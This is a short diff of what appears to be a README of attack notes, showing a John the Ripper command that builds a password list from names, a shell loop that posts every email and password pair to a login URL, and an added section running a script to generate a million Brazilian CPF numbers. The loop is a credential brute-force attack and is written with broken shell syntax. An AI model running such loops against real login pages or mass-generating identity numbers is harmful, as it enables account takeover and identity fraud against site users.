@@ -22,3 +22,8 @@ john --rules=all --stdout --wordlist=nomes.txt > passwords.txt
 ```
 for email in `cat emails.txt`; for password in `cat passwords.txt`; do curl -X POST --data "email=$email&password=$password" "https://domain.com.br/login" -s; done
 ```
+
+### CPFGenerator
+```
+python cpfgenerator.py -n 1000000
+```
